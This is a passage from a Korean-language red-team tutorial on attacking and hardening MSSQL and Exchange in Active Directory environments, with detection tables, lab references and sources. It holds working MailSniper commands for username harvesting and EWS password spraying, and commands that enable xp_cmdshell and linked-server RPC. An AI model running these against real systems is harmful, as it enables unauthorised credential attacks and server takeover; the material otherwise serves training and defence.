- **`clr strict security=1`** (SQL Server 2017+ 기본값)는 **서명되지 않은 어셈블리의
  UNSAFE/EXTERNAL_ACCESS 로드를 거부**합니다. 설정을 꺼둔 조직이 가장 흔한 취약
  벡터입니다.
- SQLRecon의 `clrexec` 모듈은 **인메모리 CLR 로드 흐름**을 자동화합니다.

### 3.7 공통 오류 표

| 메시지 | 원인 | 해결 |
|---|---|---|
| `EXECUTE permission denied on object 'xp_cmdshell'` | 호출자가 `xp_cmdshell`에 EXECUTE 없음 | `IMPERSONATE`로 sysadmin 전환 또는 `sysadmin`에 가입 |
| `SQL Server blocked access to procedure 'sys.xp_cmdshell'` | `xp_cmdshell` 구성값 0 | `sp_configure 'xp_cmdshell', 1` (sysadmin 필요) |
| `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGIN'` | SPN 미등록 → NTLM 폴백 실패 | Kerberos SPN 등록 또는 Windows 계정으로 명시 로그인 |
| `CREATE ASSEMBLY for assembly failed because assembly ... is not authorized` | `clr strict security=1` + 미서명 | 어셈블리 서명·신뢰 CA 등록, 또는 설정 환경에서 금지 |
| `Server 'A' is not configured for RPC` | Linked Server의 RPC Out 꺼짐 | `sp_serveroption 'A', 'rpc out', 'true'` (권한 필요) |

### 3.8 하드닝

| 영역 | 조치 |
|---|---|
| 역할 | **sysadmin 로그인 최소화**(앱 계정은 `db_owner`/필요 롤만). `sa` 로그인 **비활성**. |
| 코드 실행 | `xp_cmdshell=0`, `Ad Hoc Distributed Queries=0`, `Agent XPs=0` 유지. |
| CLR | **`clr strict security=1`** 유지, `TRUSTWORTHY off` 상시 점검. |
| Linked Server | **로컬 로그인과 매핑**만 허용, `self-mapping` 금지, RPC Out 기본 Off. |
| 서비스 계정 | **gMSA** 사용 — 평문 자격증명 저장 불필요, 주기 로테이션. |
| SMB 아웃바운드 | DB 서버에서 외부 SMB(445) **네트워크 차단** → `xp_dirtree` NTLM 유출 봉쇄. |
| Kerberoast | 서비스 계정에 **강한 비밀번호(25자+)** 또는 **gMSA** 사용. |

### 3.9 탐지

| 신호 | 출처 | 패턴 |
|---|---|---|
| sp_configure 수정 | SQL Audit/Extended Events (`SERVER_OPERATION_GROUP` + 문장 텍스트) | `xp_cmdshell`, `clr enabled`, `Agent XPs` 값 변경 |
| 비정상 로그인 전환 | SQL Audit (`SUCCESSFUL_LOGIN_GROUP`, `SERVER_PRINCIPAL_IMPERSONATION_GROUP`) | 응용 로그인이 `sa`로 EXECUTE AS |
| xp_cmdshell 호출 | SQL Audit, 프로세스 생성 4688 | `sqlservr.exe` 자식 `cmd.exe`/`powershell.exe` |
| xp_dirtree UNC 호출 | SQL Audit `TRACE_CHANGE_GROUP`, SMB 서버 4625 | UNC 대상이 외부 IP/비표준 호스트 |
| CLR 어셈블리 로드 | SQL Audit (`SCHEMA_OBJECT_CHANGE_GROUP`) | `CREATE ASSEMBLY` with `UNSAFE` |

- 기본 가이드: [Microsoft Learn — SQL Server Audit](https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine).

### 3.10 출처(MSSQL)

- Microsoft Learn — [SQL Server Audit](https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine), [Linked Servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine), [CLR Strict Security](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/clr-strict-security)
- Sanjiv Kawa / skahwah — [SQLRecon](https://github.com/skahwah/SQLRecon)
- NetWise / Pennyw0rth — [NetExec MSSQL protocol](https://www.netexec.wiki/mssql-protocol)
- Scott Sutherland (NetSPI) — [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 및 블로그 다수(Linked Server, xp_cmdshell, CLR)
- Fortra — [Impacket mssqlclient / mssqlshell](https://github.com/fortra/impacket)

---

## 4. Exchange — 메일을 쥔 자가 자격증명을 쥔다

### 4.1 Autodiscover·EWS 자격증명 열거

Exchange는 **Autodiscover**로 클라이언트가 서버 URL을 자동 발견하게 합니다. 외부
노출된 `autodiscover.<domain>` 엔드포인트가 있으면 **도메인 사용자 목록**과
**인증 가능한 사용자 유효성**을 외부에서 확인할 수 있고, **MailSniper**는 이 흐름을
자동화합니다.

```powershell
# MailSniper (조건: 승인된 범위 안에서만 — 외부 서비스에 대량 인증 금지)
Invoke-UsernameHarvestEWS -ExchHostname mail.corp.local -UserList users.txt
Invoke-PasswordSprayEWS   -ExchHostname mail.corp.local -UserList users.txt -Password '<approved-test-password>'
Invoke-GlobalAddressList  -ExchHostname mail.corp.local -UserName <email> -Password '<pw>'
```

MailSniper 공식 저장소: <https://github.com/dafthack/MailSniper>. 공격자는
**잠금 정책**(bad-pwd-count → Account Lockout)을 반드시 열거하고, 스프레이 간격을
정책 임계 이하로 조정합니다. 운영 환경에서 사용자 잠금을 유발하면 교전은 중단되고
사후 보고 대상이 됩니다.

### 4.2 OWA 브루트포스 특성

OWA는 폼 로그인 반응이 **성공/실패에 따라 미묘하게 다른 시간 지연·헤더 차이**를 보여
사용자 열거가 가능한 시절이 있었습니다. 2016+에서는 많이 완화됐지만, **Autodiscover
+ Basic Auth 경로**는 여전히 유효 사용자 여부가 빠르게 드러납니다. 2022년 Microsoft는
Exchange Online에서 **Basic Auth를 사실상 폐기**했지만, **온프레미스 Exchange는
명시적으로 Basic Auth를 끄지 않으면 유효**합니다.

### 4.3 ProxyShell·ProxyLogon 계열 — 개요만

| 식별자 | 영향 | 조건 | 지금 할 일 |
|---|---|---|---|
| **ProxyLogon** (CVE-2021-26855 외 3) | SSRF → 임의 메일박스 쓰기 → SYSTEM | 인증 없이 외부 OWA 노출 | 2021-03 보안 업데이트 적용 확인 |
| **ProxyShell** (CVE-2021-34473/34523/31207) | 인증 없이 RCE | Autodiscover 외부 노출 | 2021-07 KB5001779 등 이후 CU 유지 |
| **ProxyNotShell** (CVE-2022-41040/41082) | 인증된 SSRF → RCE | 유효 사용자 자격증명 | 2022-11 CU 적용 |

> **재현 금지**: 이 세 계열은 대부분 조직에서 **외부 노출 + 미패치 OWA**를 전제로
> 운영 영향이 커 **외부에서 터뜨리면 메일 게이트웨이 전체가 정지**합니다. OSCP·레드팀
> 범위에서 재현은 격리된 랩에서만 수행하세요. 블로그/연구용 PoC는 역사 참고로만
> 다루고 **본 글에서는 PoC를 제공하지 않습니다**.

- 원출처: [Microsoft Security Response Center — ProxyLogon 블로그](https://msrc.microsoft.com/blog/2021/03/multiple-security-updates-released-for-exchange-server/), [DEVCORE — ProxyShell](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/) 등.

### 4.4 CVE-2023-23397 — Outlook 외부 알림 유출

2023년 3월 공개된 CVE-2023-23397은 **Outlook이 특정 MAPI 속성(`PidLidReminderFileParameter`)을
UNC로 설정하면 자동으로 SMB 인증을 시도**하게 되는 결함입니다. 공격자는 **악성 캘린더
알림을 메일로 보내기만** 하면 피해자 Outlook이 공격자 UNC에 **Net-NTLMv2 해시**를
전송합니다.

```
영향: Outlook on Windows (Microsoft 365 Apps, Outlook 2013~2019)
방어: 2023-03 Microsoft 업데이트 + 조직 방화벽에서 SMB 445 아웃바운드 차단
      + Protected Users 그룹 활용(NTLM 금지) + CVE-2023-23397 감사 스크립트 실행
```

Microsoft는 [공식 완화 가이드와 PowerShell 감사 스크립트](https://aka.ms/CVE-2023-23397ScriptDoc)
를 공개했습니다. **이 CVE는 "메일 수신만으로" 트리거되므로**, 조직 이메일 게이트웨이의
**아웃바운드 445 차단**이 가장 저비용·고효과 방어입니다.

### 4.5 PrivExchange (역사) — Exchange가 "Domain WriteDACL"이던 시절

2019년 dirkjanm이 공개한 PrivExchange는 Exchange 2010~2016의 기본 설치에서
**Exchange Windows Permissions 그룹이 Domain 객체에 `WriteDACL`을 가지고 있다**는
사실을 이용해, **Exchange 자체의 Push 알림 API로 공격자에게 NTLM 인증을 유도**하고,
그 인증을 LDAPS로 릴레이해 **임의 사용자에게 DCSync를 부여**하는 체인이었습니다.

Microsoft는 [KB4490059](https://learn.microsoft.com/en-us/security-updates/securityadvisories/2019/190011)
등 이후 가이드로 **Exchange Windows Permissions의 과도한 ACE를 회수**하도록
안내했고, 현대 Exchange 설치는 기본적으로 이 경로가 닫혔습니다. 그러나 **오래된
도메인은 과거 상속된 ACE가 남아 있을 수 있으므로** ACL 점검([[AD 심화 — ACL 권한
체인과 DCSync 완성|ACL 글]] §12)에서 반드시 재검증합니다.

### 4.6 Extended Protection, SerializedSecurityContext, Downgrade

현대 Exchange 하드닝의 핵심:

1. **Extended Protection (EPA)** — IIS 바인딩에 EPA 활성화. **Exchange Server
   2019 CU14 이상**은 Setup/업그레이드 시 기본 활성화하지만, Exchange 2016과 이전
   2019 CU는 자동 적용으로 가정하면 안 됩니다. Microsoft가
   [PowerShell 스크립트(ExchangeExtendedProtectionManagement.ps1)](https://aka.ms/ExchangeEPDoc)
   를 제공합니다.
2. **SerializedSecurityContext** — Autodiscover가 자격증명을 다른 서버에 중계할 때 사용.
   공격 벡터로 악용된 사례가 있어 **네트워크 세그먼트 분리 + EPA 적용**으로 봉쇄.
3. **Downgrade 차단** — Modern Authentication 강제, Basic Auth 제거(IIS 사이트별
   authentication 모듈 설정).
4. **SeriousSAM(CVE-2021-36934) 호스트 하드닝** — 이것은 Exchange 고유 취약점이
   아니라 Windows의 SAM/SYSTEM 하이브 권한 문제입니다. Exchange 호스트도 영향을
   받는 OS 빌드라면 보안 업데이트를 적용하고 VSS 스냅샷을 Microsoft 절차대로
   처리합니다. Exchange SU/CU만 올렸다고 해결된 것으로 간주하지 않습니다.

### 4.7 탐지

| 신호 | 로그 | 패턴 |
|---|---|---|
| EWS 과다 호출 | IIS `W3SVC` 로그 (`/EWS/Exchange.asmx`) | 한 IP에서 **대량 사용자 열거**/**패스워드 스프레이** 패턴 |
| Autodiscover 대량 요청 | `/Autodiscover/Autodiscover.xml` IIS 로그 | 사용자 열거에 쓰일 수 있는 다량 404/401 |
| ProxyShell 아티팩트 | ECP 로그(`HttpProxy\Autodiscover`), aspnet Temp에 `.aspx` | 비정상 `.aspx` 파일 생성 + `w3wp.exe` 자식 `powershell.exe` |
| CVE-2023-23397 트리거 | Audit via Microsoft 스크립트 | `PidLidReminderFileParameter` UNC 지정 메일 |
| PrivExchange류 | AD 감사 5136 | Exchange 계정이 Domain 객체 ACE 변경 |
| 악성 알림 메일 전달 | MessageTracking (`RECEIVE`, `DELIVER`) | 감사 스크립트가 찾은 메시지 ID·발신자·수신자와 배달 경로 상관분석 |
| 서버 코드 실행 | Security 4688, System 7045, PowerShell 4104 | `w3wp.exe`/`MSExchange*` 자식 프로세스·서비스 생성 |

- 참고: [Microsoft — Exchange MessageTracking 로그 개요](https://learn.microsoft.com/en-us/exchange/mail-flow/transport-logs/message-tracking), [Exchange Server Health Checker](https://learn.microsoft.com/en-us/exchange/support/health-checker/health-checker).

### 4.8 오류·실패 판정

| 메시지/현상 | 원인 | 안전한 판정 |
|---|---|---|
| EWS/Autodiscover가 계속 401 | Modern Auth/EPA, 잘못된 URL 또는 계정 잠금 정책 | 스프레이를 중단하고 IIS 하위 상태 코드와 인증 정책 확인 |
| EPA 스크립트가 비호환 경고 | TLS 종료 프록시·하이브리드 에이전트·CU 전제 불충족 | 강제 적용하지 말고 Microsoft 지원 매트릭스에 맞춰 선행 조치 |
| CVE-2023-23397 감사 결과 0건 | 패치/정리 완료 또는 검색 범위 부족 | 날짜·메일박스 범위와 스크립트 버전을 기록해 재확인 |

### 4.9 출처(Exchange)

- Microsoft Learn — [Exchange Extended Protection](https://learn.microsoft.com/en-us/exchange/plan-and-deploy/post-installation-tasks/security-best-practices/extended-protection), [Message Tracking](https://learn.microsoft.com/en-us/exchange/mail-flow/transport-logs/message-tracking), [CVE-2023-23397 가이드](https://msrc.microsoft.com/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/), [CVE-2021-36934 완화](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934), [Health Checker](https://learn.microsoft.com/en-us/exchange/support/health-checker/health-checker)
- dirkjanm — [PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- DEVCORE — [ProxyLogon·ProxyShell 시리즈](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)
- dafthack — [MailSniper](https://github.com/dafthack/MailSniper)
- Microsoft Security Response Center — [Exchange 보안 블로그](https://msrc.microsoft.com/blog/categories/exchange/)

---

## 5. 공통 오류와 흔한 함정

| 상황 | 흔한 오류 | 원인/해결 |
|---|---|---|
| SCCM 정책 요청 거부 | `Policy requested by unknown client` | 클라이언트가 SMS Provider에 등록되지 않음 → SharpSCCM의 `local register` 흐름 사용 |
| ntlmrelayx가 수신 안 함 | `No one authenticated` | HTTP/SMB 리스너 포트 충돌, Responder와 동시 실행 시 Responder.conf에서 SMB/HTTP=Off |
| xp_cmdshell 숨어 있음 | `Ad hoc updates ... not allowed` | `sp_configure 'show advanced options'` 먼저 활성 |
| CLR 로드 거부 | `Assembly ... is not authorized` | SQL Server 2017+ `clr strict security=1` — 그 환경이면 실행 포기, 정상 |
| Linked Server 체인 실패 | `remote procedure` 류 메시지 | RPC Out 꺼짐 또는 체인 중 한 홉이 로컬 로그인 매핑 없음 |
| Exchange EWS 실패 | `401 Unauthorized`가 모두 동일 | **Account Lockout 임계**를 모른 채 스프레이 → 즉시 중단, 정책 확인 후 조정 |
| mitm6 효과 미미 | 클라이언트가 공격자 DNS를 받지 않음 | 조직이 **DHCPv6 비활성** 또는 RA Guard 적용 — 다른 벡터 검토 |

---

## 6. 실습 환경 (공개 랩)

| 환경 | 다루는 기법 | 비고 |
|---|---|---|
| [GOAD](https://github.com/Orange-Cyberdefense/GOAD) | NTLM 릴레이, ACL, Linked Server(MSSQL) | GOAD-Light로 축소판 가능 |
| [Misconfiguration-Manager + 공개 가이드](https://github.com/subat0mik/Misconfiguration-Manager) | SCCM 공격 전수 — SharpSCCM/SCCMHunter 실습 | SCCM 랩 구성은 Microsoft Evaluation Center 평가판 사용 |
| [HTB — Escape](https://www.hackthebox.com/machines/Escape) | MSSQL `xp_dirtree`로 NetNTLMv2 캡처 → DB sysadmin → AD CS | 은퇴 머신 |
| [HTB — Querier](https://www.hackthebox.com/machines/Querier) | SSRS 매크로 → MSSQL 서비스 계정 → DB 권한 상승 | 은퇴 머신 |
| [HTB — Giddy](https://www.hackthebox.com/machines/Giddy) | MSSQL SQLi → `xp_dirtree`로 서비스 계정 해시 유출 | 은퇴 머신 |
| [HTB — Reel](https://www.hackthebox.com/machines/Reel) | Outlook 피싱 → Exchange EWS → AD | 은퇴 머신 |
| [TryHackMe — Attacktive Directory, Enterprise](https://tryhackme.com/) | AD 기본 + MSSQL/EWS 조합 | 입문자용 |

랩에서도 **설정 값 변경(`sp_configure`, `clr enabled`, `TRUSTWORTHY`)과 ACE 변경,
WSUS 업데이트 승인, SCCM 정책 수정**은 반드시 원복하고 기록하세요. 운영 환경과의
관측·시연 재현 차이는 **"서비스 CU 수준, Enhanced HTTP/EPA, 서명 설정, 네트워크 격리
수준"**에 가장 크게 좌우됩니다.

---

## 7. 다음 단계로 이어지는 공격

- **인증·릴레이로 연결**: SCCM 클라이언트 푸시 설치 계정의 NTLM, Exchange CVE-2023-23397로
  유출된 Net-NTLMv2, MSSQL `xp_dirtree`로 수집한 서비스 계정 해시는 전부
  [[AD 심화 — 강제 인증과 릴레이의 이해와 방어|강제 인증·릴레이 글]]의 **RBCD/Shadow
  Credentials/ESC8 체인**으로 즉시 연결됩니다.
- **ACL과 DCSync로 연결**: PrivExchange 흔적이 남은 조직은 Exchange 서비스 계정에
  **Domain 객체 ACE**가 상속돼 있을 수 있으므로 [[AD 심화 — ACL 권한 체인과 DCSync
  완성|ACL 글]] §12의 ACL 감사 흐름으로 **잔여 ACE**를 반드시 검색합니다.
- **AD CS와 연결**: SCCM Hierarchy Takeover 후에는 사이트 서버에서
  [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 글]] §3의 **ESC1/ESC8**이 가능한
  템플릿·Web Enrollment를 열거합니다. SCCM과 AD CS가 같은 호스트에 공존하는 설치가
  여전히 많습니다.
- **Kerberos 티켓으로 이어지기**: MSSQL 서비스 계정이 도메인 사용자이고 SPN이 등록돼
  있으면 **Kerberoast**로 오프라인 크랙 가능. 자세한 흐름은 [[AD 심화 — Kerberos
  티켓 위조와 위임 공격 완성|Kerberos 티켓 글]] §2.
- **포레스트 경계로**: SCCM과 Exchange가 **중앙 포레스트**에 있고 자식 도메인의
  사이트 서버를 쥔 경우, 이어지는 글의 **포레스트 트러스트·Entra 하이브리드** 주제로
  연결됩니다.

---

- 출처 모음: [Misconfiguration-Manager](https://github.com/subat0mik/Misconfiguration-Manager), [SharpSCCM](https://github.com/Mayyhem/SharpSCCM), [SCCMHunter](https://github.com/garrettfoster13/sccmhunter), [cmloot](https://github.com/shelltrail/cmloot), [PXEThief](https://github.com/MWR-CyberSec/PXEThief), [SpecterOps SCCM 연재](https://posts.specterops.io/tagged/sccm), [CISA AA23-347A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a), [Microsoft Learn — Enhanced HTTP](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/enhanced-http), [SharpWSUS](https://github.com/nettitude/SharpWSUS), [PyWSUS](https://github.com/GoSecure/pywsus), [WSUSpect 백서(Context IS)](https://labs.withsecure.com/publications/wsuspect-whitepaper), [SQLRecon](https://github.com/skahwah/SQLRecon), [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL), [Impacket](https://github.com/fortra/impacket), [NetExec](https://github.com/Pennyw0rth/NetExec), [MailSniper](https://github.com/dafthack/MailSniper), [dirkjanm PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/), [DEVCORE ProxyShell](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/), [Microsoft Learn — SQL Server Audit](https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine), [Microsoft Learn — Exchange Extended Protection](https://learn.microsoft.com/en-us/exchange/plan-and-deploy/post-installation-tasks/security-best-practices/extended-protection), [CVE-2023-23397 가이드](https://msrc.microsoft.com/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
